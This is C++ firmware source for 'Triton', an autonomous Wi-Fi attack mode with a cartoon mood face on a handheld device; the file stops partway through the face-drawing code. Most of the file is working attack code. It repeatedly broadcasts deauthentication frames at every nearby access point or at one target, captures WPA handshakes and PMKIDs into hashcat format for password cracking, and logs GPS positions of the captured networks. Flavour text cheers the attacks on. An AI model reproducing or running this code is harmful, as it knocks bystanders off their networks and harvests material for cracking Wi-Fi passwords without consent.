/*
 * triton — autonomous handshake hunter with personality.
 *
 * Poseidon's son runs the capture task in the background and shows a
 * little ASCII face with a mood that reflects how well he's hunting.
 *
 * Under the hood:
 *   - Background FreeRTOS task: channel-hop promisc, EAPOL parse,
 *     hashcat 22000 writer (same logic as wifi_pmkid). Hunt mode
 *     is ALWAYS on — broadcast-deauths every seen BSSID every 3s.
 *   - Mood state machine drives the face + one-line thought bubble.
 *
 * Moods:
 *   SLEEPY   — just started, no captures yet
 *   HUNTING  — actively stalking, no catches yet but >30s in
 *   HUNGRY   — a while with no new catches
 *   STOKED   — just grabbed one, celebratory face for 5s
 *   HUNGRY2  — 5 min dry spell, starting to give up
 *   FERAL    — 10+ captures stacked, unhinged energy
 */
#include "app.h"
#include "../theme.h"
#include "ui.h"
#include "input.h"
#include "radio.h"
#include "menu.h"
#include "c5_cmd.h"
#include "wifi_types.h"
#include "wifi_deauth_frame.h"
#include "../wifi_wardrive.h"
#include "../gps.h"
#include "../sfx.h"
#include <WiFi.h>
#include <esp_wifi.h>
#include <esp_bt.h>
#include <esp_heap_caps.h>
#include <esp_netif.h>
#include <esp_event.h>
#include <SD.h>
#include "../sd_helper.h"
#include "../argus.h"

/* Dirty flag — when set, next redraw runs a full ui_clear_body before
 * drawing UI cells. Lets us wipe overlay residue / first-entry menu
 * bleed-through without paying the per-frame flicker cost of always
 * clearing. extern so the same-file ui_action_overlay caller can set
 * it (forward-declared in two places). */
bool s_triton_dirty = false;

static volatile uint32_t s_pmk   = 0;
static volatile uint32_t s_hs    = 0;
static volatile uint32_t s_eapol = 0;
static volatile uint32_t s_deauth_frames = 0;   /* total deauth/disassoc TX sent this session */
static volatile uint32_t s_hop_iter = 0;        /* hop_task while-loop iteration counter — diag */
static volatile bool     s_phase_5g = false;    /* false = 2.4 GHz active, true = 5 GHz via C5 */
static volatile uint32_t s_last_catch = 0;
static volatile uint32_t s_born = 0;
static volatile uint8_t  s_ch    = 1;
static volatile bool     s_alive = false;
static File              s_file;
/* Parallel wardrive-compatible CSV — only opened if GPS has a fix
 * during the session. Columns mirror wifi_wardrive's output so a
 * capture session dumps straight into the same WiGLE pipeline. */
static File              s_wdr_file;

/* ---- modes ---- */
enum triton_mode_t {
    TM_HUNT,      /* default: deauth every 3s on every known AP, RL-weighted hops */
    TM_STEALTH,   /* observe-only: no deauths, capture organic handshakes */
    TM_SURGICAL,  /* sit on one selected target's channel, deauth only that BSSID */
    TM_STORM,     /* uniform-random hops, deauth every 1s, max aggression */
};
static volatile triton_mode_t s_mode = TM_HUNT;
static uint8_t s_target_bssid[6] = {0};
static uint8_t s_target_ch       = 1;
static const char *mode_name(triton_mode_t m) {
    switch (m) {
    case TM_HUNT:     return "HUNT";
    case TM_STEALTH:  return "STEALTH";
    case TM_SURGICAL: return "SURGICAL";
    case TM_STORM:    return "STORM";
    }
    return "?";
}
static const char *mode_blurb(triton_mode_t m) {
    switch (m) {
    case TM_HUNT:     return "default. deauth + RL hopping";
    case TM_STEALTH:  return "passive observe, no TX";
    case TM_SURGICAL: return "lock to one AP, hammer it";
    case TM_STORM:    return "max aggression, every 1s";
    }
    return "";
}

/* ---- adaptive learning (lightweight RL) ----
 * Per-channel value estimate. Each successful capture on channel c
 * bumps s_q[c]; hop task weights dwell time by softmax of these values.
 * Persisted to SD so Triton gets smarter across power cycles.
 */
#define NCH 14  /* indices 1..13 used */
static float s_q[NCH];          /* running value */
static uint32_t s_visits[NCH];  /* times we've dwelled on this ch */
static uint32_t s_wins[NCH];    /* captures made while on this ch */

static void triton_learn_load(void)
{
    for (int i = 0; i < NCH; ++i) {
        s_q[i] = 0.5f;  /* neutral prior */
        s_visits[i] = 0;
        s_wins[i] = 0;
    }
    /* NOT sd_remount() — tearing down HSPI (SD.end + sd_spi.end +
     * SD.begin) while promiscuous RX is hot deadlocks the SD card
     * ("sdCommand: no token received") and freezes the whole system.
     * Rely on boot-time sd_mount. If the brain file doesn't exist yet,
     * the neutral prior above is the fallback. */
    if (!sd_is_mounted()) return;
    File f = SD.open("/poseidon/triton_brain.bin", FILE_READ);
    if (f && f.size() == (int)(sizeof(s_q) + sizeof(s_visits) + sizeof(s_wins))) {
        f.read((uint8_t *)s_q, sizeof(s_q));
        f.read((uint8_t *)s_visits, sizeof(s_visits));
        f.read((uint8_t *)s_wins, sizeof(s_wins));
    }
    if (f) f.close();
}

static void triton_learn_save(void)
{
    /* Same reasoning as triton_learn_load — no sd_remount. Especially
     * critical here: the pre-fix periodic 30 s save from hop_task was
     * the confirmed source of the "Triton freezes after ~30-120 s" bug. */
    if (!sd_is_mounted()) return;
    File f = SD.open("/poseidon/triton_brain.bin", FILE_WRITE);
    if (!f) return;
    f.write((const uint8_t *)s_q, sizeof(s_q));
    f.write((const uint8_t *)s_visits, sizeof(s_visits));
    f.write((const uint8_t *)s_wins, sizeof(s_wins));
    f.close();
}

/* Reward the currently-active channel whenever a capture lands. */
static void triton_reward(uint8_t ch)
{
    if (ch < 1 || ch > 13) return;
    const float alpha = 0.2f;       /* learning rate */
    s_q[ch] += alpha * (1.0f - s_q[ch]);
    s_wins[ch]++;
}

/* Pick the next channel: 80% softmax by learned value, 20% random
 * exploration so dead channels still get periodic probes. */
static uint8_t triton_pick_channel(void)
{
    if ((esp_random() & 0xFF) < 51) {
        return 1 + (esp_random() % 13);
    }
    float total = 0;
    for (int i = 1; i <= 13; ++i) total += s_q[i] + 0.05f;
    float r = ((float)(esp_random() & 0xFFFF) / 65536.0f) * total;
    float acc = 0;
    for (int i = 1; i <= 13; ++i) {
        acc += s_q[i] + 0.05f;
        if (r <= acc) return (uint8_t)i;
    }
    return 1 + (esp_random() % 13);
}

/* Cache: BSSID -> SSID (from beacons) so handshakes get real ESSID.
 * Written from cb() on the Wi-Fi task, read from hop_task + SD writer on
 * another core — guarded by s_bs_mux to prevent torn reads of BSSID/SSID. */
struct bs_t { uint8_t bssid[6]; char ssid[33]; };
#define BS_N 24
static bs_t s_bs[BS_N];
static volatile int s_bs_n = 0;
static portMUX_TYPE s_bs_mux = portMUX_INITIALIZER_UNLOCKED;

/* Deferred capture queue. Wi-Fi promisc callback runs in the Wi-Fi task
 * at high priority and MUST NOT do SPI I/O — it'd contend with the SD
 * mutex and has tripped WDT resets in past testing. Callback builds the
 * hashcat line and enqueues it; hop_task drains + flushes to SD. */
struct capture_t { char line[1024]; };
#define CAPTURE_Q 8
static capture_t s_capq[CAPTURE_Q];
static volatile int s_capq_head = 0;
static volatile int s_capq_tail = 0;
static portMUX_TYPE s_capq_mux = portMUX_INITIALIZER_UNLOCKED;

static void capture_enqueue(const char *line)
{
    portENTER_CRITICAL(&s_capq_mux);
    int next = (s_capq_head + 1) % CAPTURE_Q;
    if (next != s_capq_tail) {
        strncpy(s_capq[s_capq_head].line, line, sizeof(s_capq[0].line) - 1);
        s_capq[s_capq_head].line[sizeof(s_capq[0].line) - 1] = '\0';
        s_capq_head = next;
    }
    /* On queue full we drop — better than blocking the Wi-Fi task. */
    portEXIT_CRITICAL(&s_capq_mux);
}

/* Throttled SD commit. Drain the queue to the file object every call
 * (cheap — FatFS buffers in RAM), but only call flush() to push bytes
 * to the card every ~3 s. Previously flushing per line thrashed HSPI
 * concurrent with softAP TX + ESP-NOW RX and deadlocked the driver
 * ~20 s into a hunt. Session exit still does a final flush + close. */
static uint32_t s_last_flush_ms = 0;

static void capture_flush(void)
{
    bool wrote = false;
    while (true) {
        char line[1024];
        bool have = false;
        portENTER_CRITICAL(&s_capq_mux);
        if (s_capq_tail != s_capq_head) {
            strncpy(line, s_capq[s_capq_tail].line, sizeof(line) - 1);
            line[sizeof(line) - 1] = '\0';
            s_capq_tail = (s_capq_tail + 1) % CAPTURE_Q;
            have = true;
        }
        portEXIT_CRITICAL(&s_capq_mux);
        if (!have) break;
        if (s_file) {
            s_file.print(line);
            wrote = true;
        }
    }
    /* Flush captures to the card almost immediately (was 3 s). Handshakes
     * are rare + precious — a 3 s window meant an OOM crash OR a user
     * powering off without ESC lost everything still in the FatFS buffer
     * (GitHub: "not saving shakes to SD"). 500 ms still coalesces a
     * post-deauth reconnect burst so we don't thrash HSPI per line. */
    uint32_t now = millis();
    if (wrote && s_file && now - s_last_flush_ms > 500) {
        s_file.flush();
        s_last_flush_ms = now;
    }
}

/* Pending M1 for (BSSID, STA) pair awaiting M2. */
struct m1_t {
    uint8_t bssid[6], sta[6], anonce[32];
    uint8_t m1_eapol[256];
    int     m1_len;
    uint32_t ts;
};
#define M1_N 8
static m1_t s_m1[M1_N];
static volatile int s_m1_n = 0;

/* Caller copies the SSID into a local buffer under the mux — returning
 * a pointer to s_bs[].ssid would let it be overwritten mid-use. */
static void ssid_of(const uint8_t *b, char *out, size_t out_sz)
{
    out[0] = '\0';
    portENTER_CRITICAL(&s_bs_mux);
    for (int i = 0; i < s_bs_n; ++i) {
        if (memcmp(s_bs[i].bssid, b, 6) == 0) {
            strncpy(out, s_bs[i].ssid, out_sz - 1);
            out[out_sz - 1] = '\0';
            break;
        }
    }
    portEXIT_CRITICAL(&s_bs_mux);
}

static void hexcat(char *dst, const uint8_t *src, int n)
{
    int o = strlen(dst);
    for (int i = 0; i < n; ++i) o += sprintf(dst + o, "%02x", src[i]);
}

/* Pending wardrive row. Produced inside the promisc cb, drained on
 * hop_task in capture_flush() so SD I/O never runs from the WiFi
 * callback context — WiFi RX + SD HSPI from the same task eventually
 * deadlocks the driver under sustained capture load. Fields captured
 * by-value because gps_fix_t + channel + names can all mutate by the
 * time the drain runs. */
struct wdr_row_t {
    uint8_t  bssid[6];
    char     ssid[33];
    char     type[16];
    uint8_t  channel;
    double   lat_deg;
    double   lon_deg;
    float    alt_m;
    float    hdop;
    char     utc[12];
    bool     pending;
};
#define WDR_Q 8
static wdr_row_t s_wdr_q[WDR_Q];
static volatile int s_wdr_head = 0;
static volatile int s_wdr_tail = 0;
static portMUX_TYPE s_wdr_mux = portMUX_INITIALIZER_UNLOCKED;

static void wdr_append(const uint8_t *bssid, const char *ssid,
                       const char *type)
{
    /* In-cb: snapshot GPS + channel, enqueue row. No SD I/O here. */
    gps_fix_t g;
    if (!gps_snapshot(&g) || !g.valid || g.sats == 0) return;
    portENTER_CRITICAL(&s_wdr_mux);
    int next = (s_wdr_head + 1) % WDR_Q;
    if (next != s_wdr_tail) {
        wdr_row_t &r = s_wdr_q[s_wdr_head];
        memcpy(r.bssid, bssid, 6);
        strncpy(r.ssid, ssid, sizeof(r.ssid) - 1); r.ssid[sizeof(r.ssid) - 1] = 0;
        strncpy(r.type, type, sizeof(r.type) - 1); r.type[sizeof(r.type) - 1] = 0;
        r.channel = s_ch;
        r.lat_deg = g.lat_deg;
        r.lon_deg = g.lon_deg;
        r.alt_m   = g.alt_m;
        r.hdop    = g.hdop;
        strncpy(r.utc, g.utc, sizeof(r.utc) - 1); r.utc[sizeof(r.utc) - 1] = 0;
        r.pending = true;
        s_wdr_head = next;
    }
    portEXIT_CRITICAL(&s_wdr_mux);
}

/* Called from hop_task context — safe to touch SD. */
static void wdr_flush(void)
{
    while (true) {
        wdr_row_t row;
        bool have = false;
        portENTER_CRITICAL(&s_wdr_mux);
        if (s_wdr_tail != s_wdr_head) {
            row = s_wdr_q[s_wdr_tail];
            s_wdr_tail = (s_wdr_tail + 1) % WDR_Q;
            have = true;
        }
        portEXIT_CRITICAL(&s_wdr_mux);
        if (!have) break;
        if (!s_wdr_file) {
            s_wdr_file = sdlog_open("triton-wardrive",
                "MAC,SSID,AuthMode,FirstSeen,Channel,RSSI,"
                "CurrentLatitude,CurrentLongitude,AltitudeMeters,"
                "AccuracyMeters,Type", nullptr, 0);
            if (!s_wdr_file) continue;
        }
        s_wdr_file.printf("%02X:%02X:%02X:%02X:%02X:%02X,\"%s\",WPA2,%s,%u,0,"
                          "%.7f,%.7f,%.1f,%.1f,%s\n",
                          row.bssid[0], row.bssid[1], row.bssid[2],
                          row.bssid[3], row.bssid[4], row.bssid[5],
                          row.ssid, row.utc, row.channel,
                          row.lat_deg, row.lon_deg, row.alt_m, row.hdop,
                          row.type);
    }
}

/* Line buffers are FILE-SCOPE STATIC, not stack locals.
 *
 * emit_hs and emit_pmkid run inside the WiFi promiscuous RX callback,
 * i.e. the WiFi task's stack which IDF 5.5 ships at ~3.5 KB. A
 * 1024-byte stack buffer + call frames + hexcat scratch was walking
 * off the end in heavy-capture bursts — "froze after N captures" was
 * silent stack overflow clobbering adjacent task state. The WiFi task
 * is single-threaded so a file-scope static is safe; no reentrance
 * on the cb callsite. Same reasoning for the 300-byte pmkid buffer. */
static char s_emit_line[1024];
static char s_emit_pmk[300];

/* Voice reaction lines used by emit_pmkid / emit_hs / deauth burst.
 * Full mood-based voice system is defined further down (uses mood_t
 * which isn't declared yet). These are early-access arrays for the
 * capture/burst reactions. */
static const char *VOICE_HS_CATCH[] = {
    "GOT THE FOUR-WAY",
    "handshake bagged",
    "thats a wpa2 for you",
    "ssh check this out",
    "into the hashcat pile",
};
static const char *VOICE_PMK_CATCH[] = {
    "pmkid snagged",
    "no client needed lol",
    "AP gave it up easy",
    "passive win",
};
static const char *VOICE_DEAUTH_BURST[] = {
    "boom. burst sent",
    "kick em off",
    "they will reconnect",
    "frame factory open",
};
#define VOICE_PICK(arr) (arr)[esp_random() % (sizeof(arr)/sizeof((arr)[0]))]

static volatile const char *s_reaction = nullptr;
static volatile uint32_t    s_reaction_until = 0;
static inline void triton_say(const char *line, uint32_t hold_ms = 4000)
{
    s_reaction = line;
    s_reaction_until = millis() + hold_ms;
}

static void emit_pmkid(const uint8_t *pmkid, const uint8_t *bssid, const uint8_t *sta)
{
    char ssid[33]; ssid_of(bssid, ssid, sizeof(ssid));
    strcpy(s_emit_pmk, "WPA*01*");
    hexcat(s_emit_pmk, pmkid, 16); strcat(s_emit_pmk, "*");
    hexcat(s_emit_pmk, bssid, 6);  strcat(s_emit_pmk, "*");
    hexcat(s_emit_pmk, sta, 6);    strcat(s_emit_pmk, "*");
    for (size_t i = 0; i < strlen(ssid); ++i) {
        char h[3]; snprintf(h, sizeof(h), "%02x", (uint8_t)ssid[i]);
        strcat(s_emit_pmk, h);
    }
    strcat(s_emit_pmk, "***\n");
    capture_enqueue(s_emit_pmk);
    wdr_append(bssid, ssid, "EAPOL_PMKID");
    s_pmk++;
    s_last_catch = millis();
    triton_reward(s_ch);
    triton_say(VOICE_PICK(VOICE_PMK_CATCH));
}

static void emit_hs(const uint8_t *bssid, const uint8_t *sta,
                    const uint8_t *mic, const uint8_t *anonce,
                    const uint8_t *m2, int m2_len)
{
    if (m2_len > 256) m2_len = 256;
    if (m2_len < 0)   m2_len = 0;

    char ssid[33]; ssid_of(bssid, ssid, sizeof(ssid));
    strcpy(s_emit_line, "WPA*02*");
    char *line = s_emit_line;   /* alias so the rest of the fn reads as before */
    hexcat(line, mic, 16);    strcat(line, "*");
    hexcat(line, bssid, 6);   strcat(line, "*");
    hexcat(line, sta, 6);     strcat(line, "*");
    for (size_t i = 0; i < strlen(ssid); ++i) {
        char h[3]; snprintf(h, sizeof(h), "%02x", (uint8_t)ssid[i]);
        strcat(line, h);
    }
    strcat(line, "*");
    hexcat(line, anonce, 32); strcat(line, "*");
    hexcat(line, m2, m2_len); strcat(line, "*02\n");
    capture_enqueue(line);
    wdr_append(bssid, ssid, "EAPOL_HS");
    s_hs++;
    s_last_catch = millis();
    triton_reward(s_ch);
    triton_say(VOICE_PICK(VOICE_HS_CATCH));
}

static m1_t *m1_slot(const uint8_t *b, const uint8_t *s)
{
    for (int i = 0; i < s_m1_n; ++i)
        if (!memcmp(s_m1[i].bssid, b, 6) && !memcmp(s_m1[i].sta, s, 6))
            return &s_m1[i];
    if (s_m1_n >= M1_N) {
        int o = 0;
        for (int i = 1; i < s_m1_n; ++i) if (s_m1[i].ts < s_m1[o].ts) o = i;
        return &s_m1[o];
    }
    m1_t *e = &s_m1[s_m1_n++];
    memcpy(e->bssid, b, 6); memcpy(e->sta, s, 6);
    return e;
}

/* Lookup-only for M2 — null on miss so a cache-full evict can't pair the M2
 * with an unrelated M1's ANonce (corrupt handshake). */
static m1_t *m1_find(const uint8_t *b, const uint8_t *s)
{
    for (int i = 0; i < s_m1_n; ++i)
        if (!memcmp(s_m1[i].bssid, b, 6) && !memcmp(s_m1[i].sta, s, 6)) return &s_m1[i];
    return nullptr;
}

static void handle_eapol(const uint8_t *frame, int len)
{
    if (len < 40) return;
    uint8_t fc = frame[0], type = (fc >> 2) & 3;
    if (type != 2) return;
    uint8_t from_ds = (frame[1] >> 1) & 1, to_ds = frame[1] & 1;
    int hdr = 24;
    if ((fc >> 4) & 0x8) hdr += 2;
    if (len < hdr + 8) return;
    const uint8_t *llc = frame + hdr;
    if (!(llc[0] == 0xAA && llc[1] == 0xAA && llc[2] == 0x03 &&
          llc[6] == 0x88 && llc[7] == 0x8E)) return;
    const uint8_t *eapol = llc + 8;
    int elen = len - (eapol - frame);
    if (elen < 99 || eapol[1] != 0x03) return;   /* need through Key-Data-Length @ 97-98 */
    /* Trim trailing FCS/padding to the real EAPOL frame length (4-byte 802.1X
     * header + its length field) so emitted handshakes verify in hashcat. */
    { int real = 4 + (((int)eapol[2] << 8) | eapol[3]); if (real > 0 && real < elen) elen = real; }

    s_eapol++;

    const uint8_t *bssid, *sta;
    bool from_ap;
    if (from_ds && !to_ds)      { sta = frame + 4; bssid = frame + 10; from_ap = true; }
    else if (to_ds && !from_ds) { bssid = frame + 4; sta = frame + 10; from_ap = false; }
    else return;

    uint16_t key_info = ((uint16_t)eapol[5] << 8) | eapol[6];
    const uint8_t *nonce = eapol + 17;
    const uint8_t *mic = eapol + 81;
    /* Key-Data-Length @ frame offset 97 (after 802.1X hdr + MIC @ 81), key
     * data @ 99. Old 93/95 read into the MIC field, so PMKID was never found. */
    uint16_t kd_len = ((uint16_t)eapol[97] << 8) | eapol[98];
    const uint8_t *kd = eapol + 99;
    /* Bound kd_len to the captured frame (elen); the length field is
     * attacker-controlled and would otherwise walk past the RX buffer. */
    { int kd_avail = elen - 99; if (kd_avail < 0) kd_avail = 0;
      if ((int)kd_len > kd_avail) kd_len = (uint16_t)kd_avail; }

    /* PMKID walk. */
    if (kd_len >= 22) {
        int off = 0;
        while (off + 2 < kd_len) {
            uint8_t t = kd[off], l = kd[off + 1];
            if (off + 2 + l > kd_len) break;
            if (t == 0xDD && l >= 20 &&
                kd[off+2] == 0x00 && kd[off+3] == 0x0F && kd[off+4] == 0xAC && kd[off+5] == 0x04) {
                emit_pmkid(kd + off + 6, bssid, sta);
                break;
            }
            off += 2 + l;
        }
    }

    bool mic_set     = key_info & (1 << 8);
    bool ack_set     = key_info & (1 << 7);
    bool install_set = key_info & (1 << 6);

    if (from_ap && ack_set && !mic_set && !install_set) {
        /* M1 */
        m1_t *e = m1_slot(bssid, sta);
        if (e) {
            memcpy(e->bssid, bssid, 6);
            memcpy(e->sta, sta, 6);
            memcpy(e->anonce, nonce, 32);
            int cp = elen < (int)sizeof(e->m1_eapol) ? elen : (int)sizeof(e->m1_eapol);
            memcpy(e->m1_eapol, eapol, cp);
            e->m1_len = cp;
            e->ts = millis();
        }
    } else if (!from_ap && mic_set && !ack_set && !install_set) {
        /* M2 */
        m1_t *e = m1_find(bssid, sta);
        if (e && e->m1_len > 0) emit_hs(bssid, sta, mic, e->anonce, eapol, elen);
    }
}

static void cache_beacon(const uint8_t *bssid, const uint8_t *tags, int len)
{
    if (len < 2 || tags[0] != 0 || tags[1] == 0 || tags[1] > 32) return;
    portENTER_CRITICAL(&s_bs_mux);
    int idx = -1;
    for (int i = 0; i < s_bs_n; ++i)
        if (!memcmp(s_bs[i].bssid, bssid, 6)) { idx = i; break; }
    if (idx < 0) {
        if (s_bs_n >= BS_N) { portEXIT_CRITICAL(&s_bs_mux); return; }
        idx = s_bs_n++;
        memcpy(s_bs[idx].bssid, bssid, 6);
    }
    memcpy(s_bs[idx].ssid, tags + 2, tags[1]);
    s_bs[idx].ssid[tags[1]] = '\0';
    portEXIT_CRITICAL(&s_bs_mux);
}

static void cb(void *buf, wifi_promiscuous_pkt_type_t type)
{
    const wifi_promiscuous_pkt_t *pkt = (const wifi_promiscuous_pkt_t *)buf;
    int len = pkt->rx_ctrl.sig_len;
    if (len < 24) return;
    if (type == WIFI_PKT_MGMT) {
        uint8_t st = (pkt->payload[0] >> 4) & 0xF;
        if (st == 0x8 || st == 0x5)
            cache_beacon(pkt->payload + 16, pkt->payload + 36, len - 36 - 4);
    } else if (type == WIFI_PKT_DATA) {
        handle_eapol(pkt->payload, len);
    }
}

/* Cooperative hunt tick — replaces the old FreeRTOS hop_task.
 *
 * Multi-firmware audit (Bruce, Marauder, Evil-Cardputer, Porkchop)
 * confirmed all four run their deauth+capture concurrency from the
 * main task / Arduino loop(), no FreeRTOS xTaskCreate. POSEIDON was
 * the outlier — its 4 KB hop_task stack alloc hit the internal-SRAM
 * ceiling and pdFAIL'd, so deauth never fired. The cooperative
 * pattern sidesteps that entirely.
 *
 * triton_tick() runs ONE iteration of channel-hop + burst-window
 * check + capture drain. Caller (feat_triton's main UI loop) paces
 * via millis() vs triton_dwell_for_mode(). Returns nothing —
 * progress visible through s_hop_iter, s_deauth_frames, etc. */
static void triton_tick(uint16_t &seq, uint32_t &last_hunt)
{
    s_hop_iter++;
    extern volatile int wifi_deauth_last_rc;
    wifi_deauth_last_rc = -50;   /* iterating */

    /* Channel selection per mode. */
    switch (s_mode) {
    case TM_SURGICAL:
        s_ch = s_target_ch ? s_target_ch : 1;
        break;
    case TM_STORM:
        s_ch = 1 + (esp_random() % 13);  /* uniform random */
        break;
    case TM_HUNT:
    case TM_STEALTH:
    default:
        s_ch = triton_pick_channel();
        break;
    }
    s_visits[s_ch]++;
    esp_wifi_set_channel(s_ch, WIFI_SECOND_CHAN_NONE);

    /* Deauth cadence per mode. STEALTH never transmits. */
    uint32_t hunt_period = 0;
    switch (s_mode) {
    case TM_HUNT:     hunt_period = 1500; break;
    case TM_STORM:    hunt_period = 700;  break;
    case TM_SURGICAL: hunt_period = 1200; break;
    case TM_STEALTH:  hunt_period = 0;    break;
    }

    if (!s_phase_5g && hunt_period > 0 && millis() - last_hunt > hunt_period) {
        last_hunt = millis();
        wifi_deauth_last_rc = -100;   /* entered burst window */
        if (wifi_silent_ap_begin(s_ch) != ESP_OK) {
            capture_flush(); wdr_flush();
            return;
        }
        /* Inter-frame delay bumped 5 → 25 ms. Each
         * wifi_deauth_broadcast() fires 4 esp_wifi_80211_tx calls
         * into a 16-slot dynamic TX buffer pool (shrunk for heap).
         * At delay(5) the pool stayed saturated → ESP_ERR_NO_MEM
         * on subsequent calls. 25 ms gives the driver enough time
         * to drain 4 frames between calls. */
        if (s_mode == TM_SURGICAL) {
            int bursts = 8;
            for (int k = 0; k < bursts && s_alive; ++k) {
                int sent = wifi_deauth_broadcast(s_target_bssid, &seq);
                s_deauth_frames += (uint32_t)(sent > 0 ? sent : 0);
                delay(25);
                if (input_poll() == PK_ESC) { s_alive = false; break; }
            }
        } else {
            uint8_t bssids[BS_N][6];
            int nb = 0;
            portENTER_CRITICAL(&s_bs_mux);
            int cap = s_bs_n > BS_N ? BS_N : s_bs_n;
            for (int i = 0; i < cap; ++i) memcpy(bssids[i], s_bs[i].bssid, 6);
            nb = cap;
            portEXIT_CRITICAL(&s_bs_mux);
            if (nb == 0) wifi_deauth_last_rc = -101;
            int bursts = (s_mode == TM_STORM) ? 6 : 3;
            for (int i = 0; i < nb && s_alive; ++i) {
                for (int k = 0; k < bursts; ++k) {
                    int sent = wifi_deauth_broadcast(bssids[i], &seq);
                    s_deauth_frames += (uint32_t)(sent > 0 ? sent : 0);
                    delay(25);
                    /* A full storm window is ~144 bursts x 25ms (~3.6s); poll
                     * ESC so the keyboard isn't dead that whole time. */
                    if (input_poll() == PK_ESC) { s_alive = false; break; }
                }
                if (!s_alive) break;
            }
        }
        wifi_silent_ap_end();
        /* Once-per-burst-window dump for tooling. The on-screen TX
         * counter is authoritative, but serial-observers (test harnesses,
         * remote sessions, automation) need a programmatic check. */
        {
            static uint32_t s_last_dump_frames = 0;
            if (s_deauth_frames != s_last_dump_frames) {
                Serial.printf("[triton] tx total=%lu (+%lu) aps=%d ch=%d\n",
                              (unsigned long)s_deauth_frames,
                              (unsigned long)(s_deauth_frames - s_last_dump_frames),
                              (int)s_bs_n, (int)s_ch);
                s_last_dump_frames = s_deauth_frames;
            }
        }
        /* Re-arm promiscuous — silent_ap_end() is now a no-op but
         * keeping the rearm is cheap and matches the original. */
        esp_wifi_set_promiscuous(true);
        esp_wifi_set_promiscuous_rx_cb(cb);
        esp_wifi_set_channel(s_ch, WIFI_SECOND_CHAN_NONE);
        /* Burst-reaction voice — fire occasionally so it doesn't spam.
         * Roughly 1 in 6 deauth windows speaks. */
        if ((esp_random() % 6) == 0) {
            triton_say(VOICE_PICK(VOICE_DEAUTH_BURST), 3000);
        }
    }

    /* Drain any PMKID/handshake captures the WiFi callback enqueued
     * since the last tick. SD writes happen here on the main task,
     * NOT on the WiFi RX task. */
    capture_flush();
    wdr_flush();
}

/* Dwell between ticks, per mode. Caller compares against millis()
 * to gate the next triton_tick() call. */
static uint32_t triton_dwell_for_mode(triton_mode_t m)
{
    switch (m) {
    case TM_SURGICAL: return 1500;
    case TM_STORM:    return 450;
    case TM_STEALTH:  return 800 + (uint32_t)(s_q[s_ch] * 1500);
    case TM_HUNT:
    default:          return 450 + (uint32_t)(s_q[s_ch] * 800);
    }
}

/* ---- mood + face ---- */

enum mood_t { MOOD_SLEEPY, MOOD_HUNTING, MOOD_HUNGRY, MOOD_STOKED, MOOD_DESPAIR, MOOD_FERAL };

static mood_t mood_now(void)
{
    uint32_t now = millis();
    uint32_t age = (now - s_born) / 1000;         /* seconds since launch */
    uint32_t dry = (now - s_last_catch) / 1000;   /* seconds since last catch */
    uint32_t total = s_pmk + s_hs;

    /* Previous logic left Triton stuck in SLEEPY for 30 s then jumped
     * straight to HUNGRY (because total == 0 matched). You never saw
     * "on the hunt" until the first capture landed, which defeats the
     * whole gotchi narrative. New order:
     *   0-8 s: just booted, SLEEPY
     *   8 s+ with 0 caps, <2 min: HUNTING (actively stalking)
     *   2 min+ no caps: HUNGRY
     *   5 min+ no caps: DESPAIR
     * Capture paths unchanged. */
    if (total >= 10)                       return MOOD_FERAL;
    if (total > 0 && dry < 5)              return MOOD_STOKED;
    if (age < 8)                           return MOOD_SLEEPY;
    if (dry > 300)                         return MOOD_DESPAIR;
    if (dry > 120)                         return MOOD_HUNGRY;
    return MOOD_HUNTING;
}

static const char *mood_word(mood_t m)
{
    switch (m) {
    case MOOD_SLEEPY:  return "just waking up...";
    case MOOD_HUNTING: return "on the hunt";
    case MOOD_HUNGRY:  return "where are you...";
    case MOOD_STOKED:  return "GOT ONE!";
    case MOOD_DESPAIR: return "its too quiet";
    case MOOD_FERAL:   return "SEND THEM ALL";
    }
    return "";
}

/* Voice lines — rotating per-mood flavor text. Drawn in lieu of the
 * static mood_word above when we want the gotchi to feel alive.
 * Pulled once per mood-change + every ~12 s while idle. Keep lines
 * ≤30 chars to fit the HUD line width without truncating. */
static const char *VOICE_SLEEPY[] = {
    "yawn... where am i",
    "give me a sec",
    "booting up the hunt",
    "antenna check... ok",
    "scanning the spectrum",
};
static const char *VOICE_HUNTING[] = {
    "ears open, eyes wider",
    "im in the walls now",
    "channel hop, channel hop",
    "i smell a probe request",
    "feeling chatty waveforms",
    "stalking eapols",
    "promisc mode engaged",
    "watch them try to roam",
};
static const char *VOICE_HUNGRY[] = {
    "throw me a beacon",
    "anybody home?",
    "ssids ssids ssids...",
    "even one client please",
    "my deauth queue is dry",
    "this is the calm before",
};
static const char *VOICE_STOKED[] = {
    "thats fresh meat",
    "snagged a 4way",
    "hashcat's gonna love this",
    "PMKID? thank you",
    "tasty handshake",
    "another one for the pile",
};
static const char *VOICE_DESPAIR[] = {
    "is this thing on",
    "rf desert out here",
    "i miss the city",
    "kicked everyone twice",
    "even the trolls left",
};
static const char *VOICE_FERAL[] = {
    "SEND IT SEND IT",
    "FULL SEND DEAUTH",
    "BURN THE BSSIDS",
    "I AM THE STORM",
    "ALL CHANNELS, NO MERCY",
    "FERAL MODE: ACTIVATED",
};

static const char *voice_line_for(mood_t m)
{
    switch (m) {
    case MOOD_SLEEPY:  return VOICE_PICK(VOICE_SLEEPY);
    case MOOD_HUNTING: return VOICE_PICK(VOICE_HUNTING);
    case MOOD_HUNGRY:  return VOICE_PICK(VOICE_HUNGRY);
    case MOOD_STOKED:  return VOICE_PICK(VOICE_STOKED);
    case MOOD_DESPAIR: return VOICE_PICK(VOICE_DESPAIR);
    case MOOD_FERAL:   return VOICE_PICK(VOICE_FERAL);
    }
    return "";
}

/* Reaction-line arrays + triton_say helper hoisted near the top of
 * the file (above emit_pmkid/emit_hs which call them). */
static const char *current_voice(mood_t m)
{
    if (s_reaction && millis() < s_reaction_until) return (const char *)s_reaction;
    /* Per-mood line cached across ~12 s so it doesn't shuffle every
     * single draw. New mood = new pick. */
    static mood_t  last_mood = MOOD_SLEEPY;
    static uint32_t last_pick_ms = 0;
    static const char *cached = nullptr;
    /* First call: pick immediately (don't show empty string for the
     * first 12 s while we wait for the cache to age). */
    if (!cached || m != last_mood || millis() - last_pick_ms > 12000) {
        last_mood    = m;
        last_pick_ms = millis();
        cached       = voice_line_for(m);
    }
    return cached ? cached : "";
}

/* Triton face — cyberpunk gotchi with visor helmet + trident crown.
 * Much cooler than the old circle face. */
static void draw_face(int cx, int cy, mood_t m, uint32_t tick)
{
    auto &d = M5Cardputer.Display;
    uint16_t glow  = T_ACCENT;
    uint16_t glow2 = T_ACCENT2;
    uint16_t dark  = 0x10A2;  /* dark steel */
